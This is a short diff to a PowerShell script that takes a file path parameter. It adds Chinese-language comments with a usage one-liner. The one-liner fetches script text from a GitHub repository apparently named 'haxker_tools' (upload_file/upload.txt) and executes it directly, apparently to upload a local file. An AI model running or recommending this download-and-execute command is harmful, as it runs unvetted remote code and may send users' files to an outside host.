@@ -1,3 +1,6 @@
+# 請使用以下方法進行參數傳送
+# ([scriptblock]::Create((iwr -UseBasicParsing "https://raw.githubusercontent.com/brndan918/haxker_tools/refs/heads/main/upload_file/upload.txt").Content)) -path C:\test\path\file.txt
+
 param (
     [Parameter(Mandatory=$true)]
     [string]$path
